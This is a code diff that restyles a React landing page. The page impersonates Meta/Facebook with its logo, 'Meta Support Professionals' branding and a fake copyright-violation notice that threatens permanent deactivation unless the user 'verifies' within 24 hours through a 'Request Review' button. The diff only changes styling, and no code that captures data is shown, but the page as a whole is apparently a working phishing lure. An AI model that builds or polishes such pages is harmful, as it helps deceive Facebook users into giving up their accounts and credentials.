@@ -2,136 +2,74 @@ import React from 'react';
 
 function LandingPage({ onGetStarted }) {
   return (
-    <div style={{ background: '#fff' }}>
-      <style jsx>{`
-        body {
-          background-color: #f0f2f5;
-          font-family: Helvetica;
-          -webkit-font-smoothing: antialiased;
-        }
-        
-        .header-section {
-          background-color: #f9f9f9;
-          height: 55px;
-          background: #fff;
-          border-bottom: .5px solid rgba(0,0,0,.15);
-        }
-        
-        .header-container {
-          width: 90%;
-          margin: auto;
-          overflow: hidden;
-        }
-        
-        .w-25 {
-          float: left;
-        }
-        
-        .k0f0a27 {
-          color: #0866FF;
-        }
-        
-        ._a4pc {
-          height: 54px;
-        }
-        
-        .q61vvz9 {
-          fill: white;
-        }
-        
-        .body {
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-        }
-        
-        .form-wrapper {
-          border: .5px solid rgba(0, 0, 0, .15);
-          border-radius: 8px;
-          display: flex;
-          flex-direction: column;
-          max-width: 500px;
-          padding: 10px 10px;
-          width: 98%;
-          margin: auto;
-          margin-top: 5vh;
-          background-color: #fff;
-        }
-        
-        .form-wrapper h3 {
-          color: #000000e0;
-          font-size: 19px;
-          font-weight: bold;
-          margin-bottom: 3px;
-        }
-        
-        .blok1 {
-          font-size: 14px;
-          color: #000;
-          margin-bottom: 5px;
-          line-height: 1.2rem;
-        }
-        
-        .form-check {
-          box-shadow: 0 0 1px #0000001a, 0 0 4px #0000001a;
-          padding: 15px;
-          border-radius: 8px;
-          display: flex;
-          align-items: center;
-          margin-bottom: 15px;
-        }
-        
-        .btn {
-          color: #fff;
-          padding: 10px 20px;
-          font-weight: 700;
-          font-family: Helvetica, Arial, sans-serif;
-          background: #0d6efd;
-          border: none;
-          border-radius: 6px;
-          cursor: pointer;
-          width: 100%;
-        }
-        
-        .btn:hover {
-          opacity: .8;
-        }
-        
-        .Tex5 {
-          font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
-          font-size: 17px;
-          line-height: 1.2rem;
-          font-weight: bold;
-          color: #000000e0;
-          margin-left: 8px;
-        }
-      `}</style>
+    <div style={{ background: '#fff', fontFamily: 'Helvetica', WebkitFontSmoothing: 'antialiased' }}>
       
-      <div className="welcome">
-        <header className="header-section">
-          <div className="header-container">
-            <div className="w-25">
-              <div className="logo-area">
-                <svg viewBox="0 0 36 36" className="k0f0a27 _a4pc" fill="currentColor" height={40} width={40}>
+      <div style={{ backgroundColor: '#f0f2f5' }}>
+        <header style={{ 
+          backgroundColor: '#fff', 
+          height: '55px', 
+          borderBottom: '0.5px solid rgba(0,0,0,0.15)' 
+        }}>
+          <div style={{ width: '90%', margin: 'auto', overflow: 'hidden' }}>
+            <div style={{ float: 'left' }}>
+              <div>
+                <svg viewBox="0 0 36 36" style={{ color: '#0866FF', height: '54px' }} fill="currentColor" height={40} width={40}>
                   <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z" />
-                  <path className="q61vvz9" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z" />
+                  <path style={{ fill: 'white' }} d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z" />
                 </svg>
               </div>
             </div>
           </div>
         </header>
         
-        <div className="body mb-5">
-          <div className="form-wrapper">
-            <h3>Account will be deactivated</h3>
-            <div className="blok1">
+        <div style={{ 
+          display: 'flex', 
+          flexDirection: 'column', 
+          alignItems: 'center' 
+        }}>
+          <div style={{
+            border: '0.5px solid rgba(0, 0, 0, 0.15)',
+            borderRadius: '8px',
+            display: 'flex',
+            flexDirection: 'column',
+            maxWidth: '500px',
+            padding: '10px 10px',
+            width: '98%',
+            margin: 'auto',
+            marginTop: '5vh',
+            backgroundColor: '#fff'
+          }}>
+            <h3 style={{
+              color: '#000000e0',
+              fontSize: '19px',
+              fontWeight: 'bold',
+              marginBottom: '3px'
+            }}>Account will be deactivated</h3>
+            <div style={{
+              fontSize: '14px',
+              color: '#000',
+              marginBottom: '5px',
+              lineHeight: '1.2rem'
+            }}>
               Your account or the page you use has violated copyright. We will immediately limit your account or permanently disable it for non-compliance with our terms of service.
             </div>
-            <div className="blok1">
+            <div style={{
+              fontSize: '14px',
+              color: '#000',
+              marginBottom: '5px',
+              lineHeight: '1.2rem'
+            }}>
               If you think we've accidentally suspended your account, you have 24 hours to verify your account. If you miss this security notification, your account will be permanently disabled.
             </div>
-            <div className="select-issue">
-              <div className="form-check">
+            <div>
+              <div style={{
+                boxShadow: '0 0 1px #0000001a, 0 0 4px #0000001a',
+                padding: '15px',
+                borderRadius: '8px',
+                display: 'flex',
+                alignItems: 'center',
+                marginBottom: '15px'
+              }}>
                 <table border={0} cellSpacing={0} cellPadding={0} style={{ borderCollapse: 'collapse' }}>
                   <tbody>
                     <tr>
@@ -144,7 +82,14 @@ function LandingPage({ onGetStarted }) {
                         />
                       </td>
                       <td style={{ paddingLeft: '15px' }}>
-                        <div className="Tex5">Meta Support Professionals</div>
+                        <div style={{
+                          fontFamily: 'system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"',
+                          fontSize: '17px',
+                          lineHeight: '1.2rem',
+                          fontWeight: 'bold',
+                          color: '#000000e0',
+                          marginLeft: '8px'
+                        }}>Meta Support Professionals</div>
                         <div style={{ fontSize: '14px', color: '#737373', marginTop: '5px' }}>
                           We will help you solve your account problems
                         </div>
@@ -153,7 +98,22 @@ function LandingPage({ onGetStarted }) {
                   </tbody>
                 </table>
               </div>
-              <button className="btn" onClick={onGetStarted}>
+              <button 
+                style={{
+                  color: '#fff',
+                  padding: '10px 20px',
+                  fontWeight: '700',
+                  fontFamily: 'Helvetica, Arial, sans-serif',
+                  background: '#0d6efd',
+                  border: 'none',
+                  borderRadius: '6px',
+                  cursor: 'pointer',
+                  width: '100%'
+                }}
+                onMouseOver={(e) => e.target.style.opacity = '0.8'}
+                onMouseOut={(e) => e.target.style.opacity = '1'}
+                onClick={onGetStarted}
+              >
                 Request Review
               </button>
             </div>
